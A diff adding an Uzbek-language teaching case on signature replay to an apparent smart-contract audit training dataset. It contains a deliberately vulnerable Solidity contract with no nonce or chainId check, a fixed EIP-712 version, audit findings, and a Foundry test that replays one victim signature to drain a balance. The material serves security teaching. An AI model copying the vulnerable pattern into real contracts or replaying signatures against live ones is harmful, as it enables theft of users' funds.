@@ -889,5 +889,259 @@ describe("BatchTransfer Overflow Exploit (BEC style)", function () {
         result: 'Transaction Reverted: Panic(0x11) - Arithmetic overflow detected'
       }
     }
+  },
+  {
+    id: 'case-signature-replay',
+    title: 'Signature Replay Attack / Gasless Transfer',
+    fileName: 'SignatureReplay.sol',
+    category: 'signature_replay',
+    severity: 'HIGH',
+    summary: 'Metatranzaksiyalarda Nonce va ChainId validatsiyasi yo‘qligi sababli foydalanuvchining bir martalik imzosini o‘g‘irlab, hisobni cheksiz takroriy chaqiriqlar orqali bo‘shatish.',
+    historicalIncident: {
+      name: 'Wintermute & Multichain AnySwap Signature Exploits',
+      date: 'Iyun 2022',
+      stolenAmount: '$8M+ (Signature Malleability / Replay)',
+      victim: 'Cross-chain Bridges & Permit Meta-Transactions',
+      summary: 'Foydalanuvchi imzolagan tranzaksiya maʼlumotlarida unikal nonce yoki domenni ajratuvchi parametrlar bo‘lmagani tufayli bitta imzo bilan qurbonning butun balansi o‘g‘irlangan.'
+    },
+    manualAuditChecklist: [
+      {
+        id: 'chk-sig-1',
+        task: 'transferWithSig funksiyasida nonce parametr mavjudligini tekshiring.',
+        hint: 'transferWithSig faqat from, to, amount qabul qiladi. Har bir foydalanuvchi uchun unikal incrementing nonce yo‘q.',
+        completed: false
+      },
+      {
+        id: 'chk-sig-2',
+        task: 'EIP-712 DOMAIN_SEPARATOR va block.chainid tekshirilganmi?',
+        hint: 'Yo‘q! Oddiy keccak256 orqali xesh qilingan, tarmoqlararo (cross-chain replay) ham himoyalanmagan.',
+        completed: false
+      },
+      {
+        id: 'chk-sig-3',
+        task: 'ecrecover qaytargan signer manzil nol (address(0)) ga tekshirilganmi?',
+        hint: 'Nol manzil tekshiruvi yo‘q, buzilgan imzo kiritilsa signer = address(0) qaytishi mumkin.',
+        completed: false
+      }
+    ],
+    vulnerableCode: `// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+/**
+ * @title SignatureReplay (ZAIF VERSIYA)
+ * @notice Gasless transfer / Meta-tranzaksiya orqali token o'tkazish
+ * @dev ZAIFLIK: SWC-121 (Missing Protection against Signature Replay Attacks)
+ *      Nonce va chainId yo'q, xuddi shu imzoni qayta-qayta ishlatib hisobni bo'shatish mumkin.
+ */
+contract SignatureReplay {
+    mapping(address => uint256) public balances;
+
+    event Transfer(address indexed from, address indexed to, uint256 amount);
+
+    constructor() {
+        balances[msg.sender] = 1_000_000;
+    }
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    // [XATO]: Nonce yoki ChainId tekshiruvi yo'q! Imzo istalgancha takrorlanadi
+    function transferWithSig(
+        address from,
+        address to,
+        uint256 amount,
+        bytes32 r,
+        bytes32 s,
+        uint8 v
+    ) external {
+        bytes32 messageHash = keccak256(abi.encodePacked(from, to, amount));
+        bytes32 ethSignedMessageHash = keccak256(
+            abi.encodePacked("\\x19Ethereum Signed Message:\\n32", messageHash)
+        );
+
+        address signer = ecrecover(ethSignedMessageHash, v, r, s);
+        require(signer == from, "Yaroqsiz imzo");
+        require(balances[from] >= amount, "Mablag' yetarli emas");
+
+        balances[from] -= amount;
+        balances[to] += amount;
+
+        emit Transfer(from, to, amount);
+    }
+}`,
+    fixedCode: `// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+/**
+ * @title SignatureReplaySecure (TUZATILGAN XAVFSIZ VERSIYA)
+ * @notice EIP-712 domen ajratgichi, inkremental Nonce va ChainId orqali qayta imzo hujumini to'liq bloklaydi
+ */
+contract SignatureReplaySecure {
+    mapping(address => uint256) public balances;
+    mapping(address => uint256) public nonces;
+
+    bytes32 public immutable DOMAIN_SEPARATOR;
+    bytes32 public constant TRANSFER_TYPEHASH =
+        keccak256("TransferWithSig(address from,address to,uint256 amount,uint256 nonce)");
+
+    event Transfer(address indexed from, address indexed to, uint256 amount);
+
+    constructor() {
+        DOMAIN_SEPARATOR = keccak256(
+            abi.encode(
+                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
+                keccak256(bytes("SecureToken")),
+                keccak256(bytes("1")),
+                block.chainid,
+                address(this)
+            )
+        );
+    }
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function transferWithSig(
+        address from,
+        address to,
+        uint256 amount,
+        bytes32 r,
+        bytes32 s,
+        uint8 v
+    ) external {
+        // 1. Har bir tranzaksiyada Nonce oshiriladi
+        uint256 currentNonce = nonces[from]++;
+
+        // 2. EIP-712 TypeHash bilan structHash hisoblanadi
+        bytes32 structHash = keccak256(
+            abi.encode(TRANSFER_TYPEHASH, from, to, amount, currentNonce)
+        );
+        bytes32 digest = keccak256(
+            abi.encodePacked("\\x19\\x01", DOMAIN_SEPARATOR, structHash)
+        );
+
+        address signer = ecrecover(digest, v, r, s);
+        require(signer != address(0) && signer == from, "Yaroqsiz imzo");
+        require(balances[from] >= amount, "Mablag' yetarli emas");
+
+        balances[from] -= amount;
+        balances[to] += amount;
+
+        emit Transfer(from, to, amount);
+    }
+}`,
+    fixDiffNotes: [
+      'EIP-712 standartiga muvofiq DOMAIN_SEPARATOR joriy etildi (chainId va verifyingContract kiritildi).',
+      'Inkremental `nonces[from]++` hisobi qo‘shildi; bir imzo ikkinchi marta o‘tmaydi.',
+      'ecrecover nol manzil (signer != address(0)) tekshiruvi bilan mustahkamlandi.'
+    ],
+    findings: [
+      {
+        id: 'FIND-005',
+        title: 'Missing Replay Protection in Off-chain Signature Verification',
+        severity: 'HIGH',
+        category: 'signature_replay',
+        swcId: 'SWC-121',
+        cweId: 'CWE-347',
+        vulnerableLines: [22, 29],
+        description: 'transferWithSig() funksiyasida nonce yoki chainId tekshiruvi mavjud emas. Bitta imzo tajovuzkor tomonidan butun hisob bo‘shaguniga qadar takrorlanishi mumkin.',
+        impact: 'Foydalanuvchi bitta tranzaksiya uchun imzo berishi bilan tajovuzkor butun depozitni tortib oladi.',
+        rootCause: 'Xabar xeshida inkremental nonce va EIP-712 domendan foydalanilmagani.',
+        recommendation: 'EIP-712 standartini joriy qiling, xashga nonces[from] va block.chainid qo‘shing.',
+        aiDetection: {
+          status: 'correct',
+          aiSummary: 'AI funksiyada nonce yo‘qligini va replay attack ehtimolini aniqladi.',
+          humanCritique: 'AI to‘g‘ri aniqladi, ammo EIP-712 TypeHash arxitekturasini kodda to‘liq ko‘rsatib bermadi.'
+        }
+      }
+    ],
+    slitherReport: {
+      summary: 'Slither v0.10.2: 1 HIGH (missing-zero-check), 1 MEDIUM (ecrecover-zero).',
+      issues: [
+        {
+          id: 'SLITHER-07',
+          check: 'missing-zero-check',
+          impact: 'HIGH',
+          confidence: 'High',
+          description: 'SignatureReplay.transferWithSig does not verify signer != address(0).',
+          lines: [29],
+          recommendation: 'Add require(signer != address(0)) to prevent address(0) approvals.'
+        }
+      ]
+    },
+    exploitScenario: {
+      testFramework: 'Foundry',
+      testFileName: 'SignatureReplayExploit.t.sol',
+      testCode: `// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "forge-std/Test.sol";
+import "../contracts/SignatureReplay.sol";
+import "../contracts/SignatureReplaySecure.sol";
+
+contract SignatureReplayExploitTest is Test {
+    SignatureReplay vulnerableContract;
+    SignatureReplaySecure secureContract;
+
+    uint256 victimPrivateKey = 0xA11CE;
+    address victim;
+    address attacker = address(0xBAD);
+
+    function setUp() public {
+        victim = vm.addr(victimPrivateKey);
+        vulnerableContract = new SignatureReplay();
+        secureContract = new SignatureReplaySecure();
+
+        vm.deal(victim, 20 ether);
+        vm.prank(victim);
+        vulnerableContract.deposit{value: 10 ether}();
+        vm.prank(victim);
+        secureContract.deposit{value: 10 ether}();
+    }
+
+    function testSignatureReplayDrain() public {
+        bytes32 messageHash = keccak256(abi.encodePacked(victim, attacker, uint256(1 ether)));
+        bytes32 ethSignedMessageHash = keccak256(
+            abi.encodePacked("\\x19Ethereum Signed Message:\\n32", messageHash)
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(victimPrivateKey, ethSignedMessageHash);
+
+        // 1-marta qonuniy transfer
+        vulnerableContract.transferWithSig(victim, attacker, 1 ether, r, s, v);
+
+        // Hujumchi shu bitta imzoni yana 9 marta qayta-qayta chaqiradi (REPLAY ATTACK!)
+        for (uint256 i = 0; i < 9; i++) {
+            vulnerableContract.transferWithSig(victim, attacker, 1 ether, r, s, v);
+        }
+
+        // Qurbon hisobi 100% bo'shatildi!
+        assertEq(vulnerableContract.balances(victim), 0);
+        assertEq(vulnerableContract.balances(attacker), 10 ether);
+    }
+}`,
+      initialState: {
+        contractBalance: '10.0 ETH',
+        attackerBalance: '0.0 ETH',
+        victimDeposit: '10.0 ETH'
+      },
+      exploitTrace: [
+        { step: 1, actor: 'Victim', action: 'Signs 1 ETH transfer with private key', gasUsed: '0', stateDelta: 'Off-chain signature (r,s,v) generated', status: 'success' },
+        { step: 2, actor: 'Attacker', action: 'transferWithSig() [1-chaqiriq]', gasUsed: '34,000', stateDelta: 'Victim = 9 ETH, Attacker = 1 ETH', status: 'success' },
+        { step: 3, actor: 'Attacker', action: 'transferWithSig() [2..10-chaqiriqlar / Replay]', gasUsed: '280,000', stateDelta: 'Xuddi shu imzo yana 9 marta ishlatildi!', status: 'hijacked' }
+      ],
+      finalStateVulnerable: {
+        contractBalance: '0.0 ETH',
+        attackerBalance: '10.0 ETH o‘g‘irlandi',
+        lossPct: '100% Jamg‘arma 1 ta imzo orqali yo‘qotildi'
+      },
+      finalStatePatched: {
+        contractBalance: '10.0 ETH saqlab qolindi',
+        attackerBalance: '1.0 ETH (faqat ruxsat berilgan 1 ETH)',
+        result: 'Transaction Reverted: Yaroqsiz imzo (nonce oshgani sababli replay bloklandi)'
+      }
+    }
   }
 ];
